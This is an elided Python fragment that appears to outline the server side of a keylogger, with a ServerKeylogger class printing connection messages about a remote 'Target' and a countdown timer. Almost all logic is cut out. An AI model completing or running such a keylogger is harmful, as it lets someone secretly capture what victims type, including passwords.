...
class ServerKeylogger:
    ...
    def start(self):
        try:
            ...
            bp.color(f"Connection has been established with {ipaddress}", "magenta")
            ...
            else: bp.color("The Target didn't type something...", "magenta")
...
class Timer:
    ...
    def countdown(self, seconds):
        ...
        print(f"Connection has been established with the ip {self.ip}")
        while seconds:
